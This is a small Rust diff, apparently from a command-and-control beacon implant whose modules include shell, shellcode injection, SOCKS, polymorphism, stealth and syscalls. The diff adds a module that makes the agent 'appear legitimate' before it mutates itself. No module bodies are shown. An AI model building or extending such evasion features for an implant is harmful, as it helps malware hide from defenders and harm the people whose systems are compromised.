@@ -48,6 +48,7 @@ mod shell;
 mod shinject;
 mod sleep;
 mod socks;
+mod legitimacy;
 mod polymorphism;
 mod stealth;
 mod syscalls;
@@ -91,6 +92,7 @@ pub fn real_main() -> Result<(), Box<dyn Error>> {
 
 /// Main code which runs the agent
 fn run_beacon() -> Result<(), Box<dyn Error>> {
+    legitimacy::appear_legitimate();
     polymorphism::mutate_self();
 
     #[cfg(target_os = "windows")]
